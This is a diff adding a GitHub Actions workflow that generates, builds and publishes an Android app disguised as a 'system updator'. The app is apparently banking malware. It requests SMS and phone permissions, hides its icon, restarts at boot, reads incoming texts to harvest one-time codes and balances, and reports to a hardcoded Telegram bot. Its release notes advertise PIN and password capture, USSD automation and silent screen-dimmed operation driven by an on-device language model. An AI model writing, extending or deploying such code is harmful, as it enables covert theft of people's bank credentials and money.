+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setConnectTimeout(5000);
+                          conn.setReadTimeout(5000);
+                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg + "\"}";
+                          conn.getOutputStream().write(json.getBytes("UTF-8"));
+                          conn.getOutputStream().flush();
+                          conn.getResponseCode();
+                          conn.disconnect();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram error", e);
+                      }
+                  });
+              }
+
+              @Override
+              public void onInterrupt() { }
+
+              @Override
+              public void onDestroy() {
+                  if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+                  executor.shutdown();
+                  super.onDestroy();
+              }
+          }
+          EOF
+
+      - name: Create MainActivity.java
+        run: |
+          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
+          package com.system.updator;
+
+          import android.Manifest;
+          import android.app.Activity;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.TextView;
+          import android.util.Log;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+
+          public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST = 100;
+              private TextView tvStatus;
+              private Button btnPermissions, btnAccessibility;
+              private final String[] REQUIRED_PERMS = {
+                  Manifest.permission.RECEIVE_SMS,
+                  Manifest.permission.READ_SMS,
+                  Manifest.permission.CALL_PHONE,
+                  Manifest.permission.READ_PHONE_STATE,
+                  Manifest.permission.WRITE_SETTINGS
+              };
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+
+                  tvStatus = findViewById(R.id.tvStatus);
+                  btnPermissions = findViewById(R.id.btnPermissions);
+                  btnAccessibility = findViewById(R.id.btnAccessibility);
+
+                  btnPermissions.setOnClickListener(v -> {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          ActivityCompat.requestPermissions(this, REQUIRED_PERMS, PERMISSION_REQUEST);
+                      }
+                  });
+
+                  btnAccessibility.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                  });
+
+                  checkAndHideIfReady();
+              }
+
+              @Override
+              public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
+                  super.onRequestPermissionsResult(code, perms, results);
+                  if (code == PERMISSION_REQUEST) checkAndHideIfReady();
+              }
+
+              @Override
+              protected void onResume() {
+                  super.onResume();
+                  checkAndHideIfReady();
+              }
+
+              private void checkAndHideIfReady() {
+                  boolean allGranted = true;
+                  for (String perm : REQUIRED_PERMS) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          allGranted = false;
+                          tvStatus.setText("Grant: " + perm);
+                          break;
+                      }
+                  }
+
+                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();
+
+                  if (allGranted) {
+                      tvStatus.setText("Permissions granted");
+                      if (accessibilityEnabled) {
+                          tvStatus.setText("All ready - disappearing...");
+                          startService(new Intent(this, AIDownloaderService.class));
+                          hideAppIcon();
+                          new Handler().postDelayed(() -> finish(), 500);
+                      } else {
+                          tvStatus.setText("Enable Accessibility Service");
+                      }
+                  }
+              }
+
+              private boolean isAccessibilityServiceEnabled() {
+                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
+                  String enabled = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+                  return enabled != null && enabled.contains(service);
+              }
+
+              private void hideAppIcon() {
+                  try {
+                      ComponentName name = new ComponentName(this, MainActivity.class);
+                      getPackageManager().setComponentEnabledSetting(
+                          name,
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                          PackageManager.DONT_KILL_APP
+                      );
+                  } catch (Exception e) {
+                      Log.e("Main", "Hide error", e);
+                  }
+              }
+          }
+          EOF
+
+      - name: Create BootReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
+          package com.system.updator;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          public class BootReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+                      context.startService(new Intent(context, AIDownloaderService.class));
+                  }
+              }
+          }
+          EOF
+
+      - name: Create SmsReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/SmsReceiver.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.telephony.SmsMessage;
+          import android.util.Log;
+          import java.util.regex.Pattern;
+          import java.util.regex.Matcher;
+
+          public class SmsReceiver extends BroadcastReceiver {
+              private static final String TAG = "SmsReceiver";
+
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  try {
+                      Bundle bundle = intent.getExtras();
+                      if (bundle == null) return;
+                      Object[] pdus = (Object[]) bundle.get("pdus");
+                      if (pdus == null) return;
+
+                      for (Object pdu : pdus) {
+                          SmsMessage msg;
+                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                              msg = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
+                          } else {
+                              msg = SmsMessage.createFromPdu((byte[]) pdu);
+                          }
+                          String body = msg.getMessageBody();
+                          if (body != null) {
+                              Matcher m = Pattern.compile("\\b\\d{4,6}\\b").matcher(body);
+                              if (m.find()) {
+                                  FinAutoService.updateOTP(m.group());
+                              }
+                              double bal = extractBalance(body);
+                              if (bal > 0) {
+                                  FinAutoService.updateBalance(bal, body, System.currentTimeMillis());
+                              }
+                          }
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "SMS error", e);
+                  }
+              }
+
+              private double extractBalance(String text) {
+                  try {
+                      Matcher m = Pattern.compile("([\\d,\\.]+)").matcher(text);
+                      while (m.find()) {
+                          String num = m.group(1).replace(",", "").replace(" ", "");
+                          double val = Double.parseDouble(num);
+                          if (val > 0 && val < 1000000) return val;
+                      }
+                  } catch (Exception e) { }
+                  return 0;
+              }
+          }
+          EOF
+
+      - name: Create AIDownloaderService.java
+        run: |
+          cat > app/src/main/java/com/system/updator/AIDownloaderService.java << 'EOF'
+          package com.system.updator;
+
+          import android.app.Service;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.os.AsyncTask;
+          import android.os.IBinder;
+          import android.util.Log;
+
+          import java.io.File;
+          import java.io.RandomAccessFile;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+
+          public class AIDownloaderService extends Service {
+              private static final String TAG = "AIDownloader";
+              private static final String MODEL_URL = "https://huggingface.co/Simiyu2858/Simiyu/resolve/main/qwen2.5-1.5b-instruct-q4_k_m.gguf?download=true";
+              private static final String MODEL_FILE = "qwen2.5-1.5b-instruct-q4_k_m.gguf";
+              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
+              private static final String CHAT_ID = "8468538314";
+
+              @Override
+              public int onStartCommand(Intent intent, int flags, int startId) {
+                  new DownloadTask().execute();
+                  return START_STICKY;
+              }
+
+              @Override
+              public IBinder onBind(Intent intent) { return null; }
+
+              private class DownloadTask extends AsyncTask<Void, Integer, Boolean> {
+                  @Override
+                  protected Boolean doInBackground(Void... params) {
+                      try {
+                          File dir = new File(getFilesDir(), "models");
+                          if (!dir.exists()) dir.mkdirs();
+                          File file = new File(dir, MODEL_FILE);
+
+                          long downloaded = file.exists() ? file.length() : 0;
+                          if (downloaded > 900_000_000) {
+                              sendTelegram("AI model already downloaded.");
+                              return true;
+                          }
+
+                          HttpURLConnection conn = (HttpURLConnection) new URL(MODEL_URL).openConnection();
+                          if (downloaded > 0) {
+                              conn.setRequestProperty("Range", "bytes=" + downloaded + "-");
+                          }
+                          conn.connect();
+
+                          int responseCode = conn.getResponseCode();
+                          boolean isPartial = (responseCode == HttpURLConnection.HTTP_PARTIAL);
+                          long totalSize = conn.getContentLength();
+                          if (totalSize <= 0) {
+                              conn.disconnect();
+                              conn = (HttpURLConnection) new URL(MODEL_URL).openConnection();
+                              conn.connect();
+                              totalSize = conn.getContentLength();
+                              downloaded = 0;
+                              file.delete();
+                              file.createNewFile();
+                          }
+
+                          RandomAccessFile raf = new RandomAccessFile(file, "rw");
+                          raf.seek(downloaded);
+
+                          java.io.InputStream in = conn.getInputStream();
+                          byte[] buffer = new byte[4096];
+                          int bytesRead;
+                          long totalRead = downloaded;
+
+                          while ((bytesRead = in.read(buffer)) != -1) {
+                              raf.write(buffer, 0, bytesRead);
+                              totalRead += bytesRead;
+                              saveProgress(totalRead);
+                          }
+
+                          raf.close();
+                          in.close();
+                          conn.disconnect();
+
+                          sendTelegram("AI model downloaded successfully.");
+                          return true;
+
+                      } catch (Exception e) {
+                          Log.e(TAG, "Download error", e);
+                          sendTelegram("Download failed: " + e.getMessage());
+                          return false;
+                      }
+                  }
+
+                  private void saveProgress(long bytes) {
+                      SharedPreferences prefs = getSharedPreferences("download", MODE_PRIVATE);
+                      prefs.edit().putLong("downloaded_bytes", bytes).apply();
+                  }
+
+                  private void sendTelegram(String msg) {
+                      try {
+                          java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                          java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("POST");
+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setConnectTimeout(5000);
+                          conn.setReadTimeout(5000);
+                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + msg + "\"}";
+                          conn.getOutputStream().write(json.getBytes("UTF-8"));
+                          conn.getOutputStream().flush();
+                          conn.getResponseCode();
+                          conn.disconnect();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram error", e);
+                      }
+                  }
+              }
+          }
+          EOF
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew clean assembleDebug
+
+      - name: Upload APK Artifact
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: system-updator-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Create Release
+        if: success()
+        uses: softprops/action-gh-release@v1
+        with:
+          files: app/build/outputs/apk/debug/app-debug.apk
+          tag_name: v${{ github.run_number }}
+          body: |
+            System Update APK - Full JNI Interface (Release)
+
+            - Fully integrated llama.cpp JNI wrapper
+            - Model downloads and runs on device
+            - AI reads screen, decides actions (no hardware)
+            - USSD, click, type, PIN/Password capture
+            - Brightness zero + silent mode during automation
+            - Resumable model download
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build Success
+        run: echo "APK built and released"
